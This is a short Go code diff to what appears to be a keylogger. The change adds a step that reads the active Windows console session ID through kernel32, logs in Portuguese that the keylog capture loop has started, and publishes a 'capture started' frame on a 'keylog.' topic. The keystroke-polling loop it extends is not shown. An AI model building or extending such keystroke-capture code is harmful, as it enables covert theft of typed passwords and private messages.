@@ -84,6 +84,13 @@ func vkToString(vk int) string {
 }
 
 func captureLoop(ctx context.Context, id string, pub publisher, log *slog.Logger) {
+	sid := currentSessionID()
+	log.Info("keylog captureLoop iniciado", "session", id, "winSession", sid)
+	_ = pub.Publish("keylog."+id, keyFrame{
+		Keys: fmt.Sprintf("[captura iniciada na sessao Windows %d]", sid),
+		Ts:   time.Now().UnixMilli(),
+	})
+
 	ticker := time.NewTicker(15 * time.Millisecond)
 	defer ticker.Stop()
 
@@ -118,4 +125,11 @@ func captureLoop(ctx context.Context, id string, pub publisher, log *slog.Logger
 			}
 		}
 	}
+}
+
+func currentSessionID() uint32 {
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	procID := kernel32.NewProc("WTSGetActiveConsoleSessionId")
+	ret, _, _ := procID.Call()
+	return uint32(ret)
 }
